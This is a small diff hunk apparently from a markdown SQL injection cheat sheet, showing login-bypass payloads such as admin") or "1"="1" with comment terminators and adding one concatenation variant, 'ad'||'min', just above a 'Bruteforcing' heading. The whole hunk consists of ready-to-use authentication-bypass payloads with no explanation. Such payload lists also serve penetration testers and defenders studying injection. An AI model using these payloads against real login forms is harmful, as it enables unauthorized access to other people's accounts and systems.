@@ -225,6 +225,7 @@ admin") or "1"="1
 admin") or "1"="1"--
 admin") or "1"="1"#
 admin") or "1"="1"/*
+'ad'||'min'
 ```
 
 ### Bruteforcing
